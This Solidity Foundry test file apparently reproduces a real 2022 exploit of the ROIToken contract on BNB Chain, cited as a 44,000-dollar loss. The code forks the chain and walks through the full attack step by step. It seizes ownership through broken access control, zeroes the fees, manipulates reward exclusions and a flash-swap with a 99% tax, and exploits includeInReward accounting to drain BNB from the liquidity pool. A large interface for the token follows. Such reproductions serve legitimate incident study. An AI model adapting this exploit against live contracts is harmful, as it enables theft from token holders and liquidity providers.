// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 157.98 BNB (~44,000 US$)
// Attacker : 0x91b7f203ed71c5eccf83b40563e409d2f3531114
// Attack Contract : 0x158af3d23d96e3104bcc65b76d1a6f53d0f74ed0
// Vulnerable Contract : https://bscscan.com/address/0xe48b75dc1b131fd3a8364b0580f76efd04cf6e9c#code (ROIToken)
// Attack Tx : 0x0e14cb7eabeeb2a819c52f313c986a877c1fa19824e899d1b91875c11ba053b0

// @NewsTrack
// Blocksec : https://twitter.com/BlockSecTeam/status/1567746825616236544
// CertiKAlert : https://twitter.com/CertiKAlert/status/1567754904663429123
// PANews : https://www.panewslab.com/zh_hk/articledetails/mbzalpdi.html
// QuillAudits Team : https://medium.com/quillhash/decoding-ragnarok-online-invasion-44k-exploit-quillaudits-261b7e23b55

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IROIToken constant ROI = IROIToken(0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c);

contract Attacker is Test {
    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant busdroiPair = IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124); // BUSD/ROI Pair

    function setUp() public {
        cheat.createSelectFork("bsc", 21_143_795);
        cheat.deal(address(this), 5 ether);
        cheat.label(address(ROI), "ROI");
        cheat.label(address(busd), "BUSD");
        cheat.label(address(wbnb), "WBNB");
        cheat.label(address(pancakeRouter), "PancakeRouter");
        cheat.label(address(busdroiPair), "BUSD/ROI Pair");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker BNB Balance:", address(this).balance, 18);

        console.log("----------------------------------------------------");
        console.log("Attacker swap some BNB to ROI for attack fund...");
        console.log("Before [WBNB, BUSD, ROI] swap:");
        emit log_named_decimal_uint("\tBNB balance of attacker:", address(this).balance, 18);
        emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9);

        address[] memory path = new address[](3);
        path[0] = address(wbnb);
        path[1] = address(busd);
        path[2] = address(ROI); // [WBNB, BUSD, ROI]
        pancakeRouter.swapETHForExactTokens{value: 5 ether}(111_291_832_999_209, path, address(this), block.timestamp); // Swap 5 bnb to busd then swap to ROI, charge 0.25% trading fee

        console.log("After [WBNB, BUSD, ROI] swap:");
        emit log_named_decimal_uint("\tBNB balance of attacker:", address(this).balance, 18);
        emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9);
        console.log("----------------------------------------------------");

        ROI.transferOwnership(address(this)); // Broken Access Control
        ROI.setTaxFeePercent(0);
        ROI.setBuyFee(0, 0);
        ROI.setSellFee(0, 0);
        ROI.setLiquidityFeePercent(0);

        // These's addresses are all of the ROI Token holders, but the [BUSD/ROI Pair] is not listed.
        // Ref: https://bscscan.com/token/0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c#balances
        ROI.excludeFromReward(address(0x575e2Cd07E4d6CCBcA708D64b4ba45521A2C0722));
        ROI.excludeFromReward(address(0x216FC1D66677c9A778C60E6825189508b9619908));
        ROI.excludeFromReward(address(0x61708418F929f264Edd312aDC7089eB9d69cEd9C));
        ROI.excludeFromReward(address(0xC81DC8F793415B80d7Ee604e936B79D85BD771B6));
        ROI.excludeFromReward(address(0x19af64CFB666d7Df8C69F884CDf5d42c0e1F9D0C));
        ROI.excludeFromReward(address(0xA982444d884e00C7dFBBCB90e7a705E567853d0E));
        ROI.excludeFromReward(address(0x899045B0B52d55Be0210A1046a01B99C78E44540));
        ROI.excludeFromReward(address(0xDdda7b2D1B9EbafD37c434b90a09fca6d014682F));
        ROI.excludeFromReward(address(0xf3C7107024e4935FbFd9f665cF5321146DfBD9a8));
        ROI.excludeFromReward(address(0x6f84160a01f3D4005eB50582d14F17B72575A80A));
        ROI.excludeFromReward(address(0x143B8568B1ef2F22f3A67229E80DCF0e6fe9bf96));
        ROI.excludeFromReward(address(0x16A31000295d1846F16B8F1aee3AeDC6b2cB730b));
        ROI.excludeFromReward(address(ROI));
        ROI.excludeFromReward(address(this));

        console.log("Attacker sends all ROI to [BUSD/ROI Pair] but withholding 100,000 ROI");
        uint256 ROI_bal = ROI.balanceOf(address(this));
        ROI.transfer(address(busdroiPair), ROI_bal - 100_000e9); // taxfee is zero
        console.log("----------------------------------------------------");

        console.log("Before flashloans from [BUSD/ROI Pair]");
        emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9); // Expect 100,000
        emit log_named_decimal_uint("\tBUSD balance of attacker:", busd.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("\tROI balance of BUSD/ROI Pair:", ROI.balanceOf(address(busdroiPair)), 9);
        emit log_named_decimal_uint("\tBUSD balance of BUSD/ROI Pair:", busd.balanceOf(address(busdroiPair)), 18);

        ROI.setTaxFeePercent(99);
        // Attacker flashloans 4,343,012 ROI from [BUSD/ROI Pair], and attacker will immediately payback
        busdroiPair.swap(4_343_012_692_003_417, 0, address(this), "3030"); // Notice: 99% taxfee will be charged from the [BUSD/ROI Pair]

        console.log("After flashloans from [BUSD/ROI Pair]");
        emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9); // Expect 0, Because #L122
        emit log_named_decimal_uint("\tBUSD balance of attacker:", busd.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("\tROI balance of BUSD/ROI Pair:", ROI.balanceOf(address(busdroiPair)), 9); // Expect before+100,000
        emit log_named_decimal_uint("\tBUSD balance of BUSD/ROI Pair:", busd.balanceOf(address(busdroiPair)), 18); // Expect same value

        ROI.setTaxFeePercent(0);
        ROI.includeInReward(address(this)); // This will set _tOwned[address(this)] = 0

        busdroiPair.sync(); // Sync reserve before swap
        path[0] = address(ROI);
        path[2] = address(wbnb); // [ROI, BUSD, WBNB]
        ROI.approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            3_986_806_268_542_825, 0, path, address(this), block.timestamp
        ); // Oops, zero ROI balance but the _rOwned[address(this)] has been bypassed
        console.log("----------------------------------------------------");
        emit log_named_decimal_uint("[End] Attacker BNB Balance:", address(this).balance, 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        require(keccak256(data) == keccak256("3030"), "Invalid PancakeSwap Callback");
        ROI.transfer(address(busdroiPair), ROI.balanceOf(address(this))); // Notice: 99% taxfee SHOULD be charged from the attacker
    }

    receive() external payable {}
}

/* -------------------- Interface -------------------- */

interface IROIToken {
    function GetBuyBackTimeInterval() external view returns (uint256);
    function GetSwapMinutes() external view returns (uint256);
    function SetBuyBackDivisor(uint256 newDivisor) external;
    function SetBuyBackMaxTimeForHistories(uint256 newMinutes) external;
    function SetBuyBackRangeRate(uint256 newPercent) external;
    function SetBuyBackTimeInterval(uint256 newMinutes) external;
    function SetSwapMinutes(uint256 newMinutes) external;
    function Sweep() external;
    function Sweep(uint256 amount) external;
    function _addressFees(address)
        external
        view
        returns (
            bool enable,
            uint256 _taxFee,
            uint256 _liquidityFee,
            uint256 _buyTaxFee,
            uint256 _buyLiquidityFee,
            uint256 _sellTaxFee,
            uint256 _sellLiquidityFee
        );
    function _buyBackDivisor() external view returns (uint256);
    function _buyBackMaxTimeForHistories() external view returns (uint256);
    function _buyBackRangeRate() external view returns (uint256);
    function _buyBackTimeInterval() external view returns (uint256);
    function _buyLiquidityFee() external view returns (uint256);
    function _buyTaxFee() external view returns (uint256);
    function _intervalMinutesForSwap() external view returns (uint256);
    function _isAutoBuyBack() external view returns (bool);
    function _isEnabledBuyBackAndBurn() external view returns (bool);
    function _liquidityFee() external view returns (uint256);
    function _maxTxAmount() external view returns (uint256);
    function _sellHistories(uint256) external view returns (uint256 time, uint256 bnbAmount);
    function _sellLiquidityFee() external view returns (uint256);
    function _sellTaxFee() external view returns (uint256);
    function _startTimeForSwap() external view returns (uint256);
    function _taxFee() external view returns (uint256);
    function afterPreSale() external;
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function buyBackEnabled() external view returns (bool);
    function buyBackSellLimit() external view returns (uint256);
    function buyBackSellLimitAmount() external view returns (uint256);
    function changeRouterVersion(address _router) external returns (address _pair);
    function deadAddress() external view returns (address);
    function decimals() external view returns (uint8);
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
    function deliver(uint256 tAmount) external;
    function excludeFromFee(address account) external;
    function excludeFromReward(address account) external;
    function getTime() external view returns (uint256);
    function getUnlockTime() external view returns (uint256);
    function includeInFee(address account) external;
    function includeInReward(address account) external;
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function isExcludedFromFee(address account) external view returns (bool);
    function isExcludedFromReward(address account) external view returns (bool);
    function lock(uint256 time) external;
    function marketingAddress() external view returns (address);
    function marketingDivisor() external view returns (uint256);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function name() external view returns (string memory);
    function owner() external view returns (address);
    function prepareForPreSale() external;
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
    function renounceOwnership() external;
    function setAddressFee(
        address _address,
        bool _enable,
        uint256 _addressTaxFee,
        uint256 _addressLiquidityFee
    ) external;
    function setAutoBuyBackEnabled(bool _enabled) external;
    function setBuyAddressFee(
        address _address,
        bool _enable,
        uint256 _addressTaxFee,
        uint256 _addressLiquidityFee
    ) external;
    function setBuyBackEnabled(bool _enabled) external;
    function setBuyBackSellLimit(uint256 buyBackSellSetLimit) external;
    function setBuyFee(uint256 buyTaxFee, uint256 buyLiquidityFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function setMarketingAddress(address _marketingAddress) external;
    function setMarketingDivisor(uint256 divisor) external;
    function setMaxTxAmount(uint256 maxTxAmount) external;
    function setNumTokensSellToAddToBuyBack(uint256 _minimumTokensBeforeSwap) external;
    function setSellAddressFee(
        address _address,
        bool _enable,
        uint256 _addressTaxFee,
        uint256 _addressLiquidityFee
    ) external;
    function setSellFee(uint256 sellTaxFee, uint256 sellLiquidityFee) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setTaxFeePercent(uint256 taxFee) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function symbol() external view returns (string memory);
    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
    function totalFees() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferForeignToken(address _token, address _to) external returns (bool _sent);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external;
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function unlock() external;
}
